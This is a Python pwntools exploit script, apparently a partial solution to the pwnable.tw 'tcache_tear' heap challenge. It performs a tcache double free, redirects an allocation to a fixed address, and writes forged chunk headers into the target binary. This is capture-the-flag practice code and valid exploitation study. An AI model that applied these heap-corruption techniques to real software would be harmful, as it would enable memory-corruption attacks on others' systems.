from pwn import *
from time import sleep

MA = '1'
FR = '2'
IN = '3'
QU = '4'
null = '\x00'

def sendInp(recunt, input):	
	io.recvuntil(recunt)
	io.send(input)

def choice(input):
	sendInp('Your choice :', input)

def size(input):
	sendInp('Size:', input)

def data(input):
	sendInp("Data:", input)

def name(input):
	sendInp('Name:', input)

def malloc(mysize, mydata):
	choice(MA)
	size(mysize)
	data(mydata)

def free():
	choice(FR)

def info():
	choice(IN)


def exploit():
	name('\x00' * 8 + '\x00' + '\x05')

	malloc('8', '\n')

	free()
	free()

	malloc('8', '\x70\x20\x60')
	malloc('8', '\n')

	malloc('8', '\x00' * 24 + '\x70\x20\x60' + '\x00' * (0x500 - 27 - 0x10) + '\x00' + '\x05' + '\x00' * 6 + '\x21' + '\x00' * 7 + '\x00\x05' + '\x00' * 6 + '\x21' + '\x00' * 7 + '\x00\x05' + '\x00' * 6 + '\x21')

	info()

	free()
	malloc('8', 'hello')

	info()

	io.recvall()

context.terminal = ["/bin/bash", "-c"]
context.log_level = 'debug'

io = process("./tcache_tear")
#io = remote('chall.pwnable.tw', 10207)
exploit()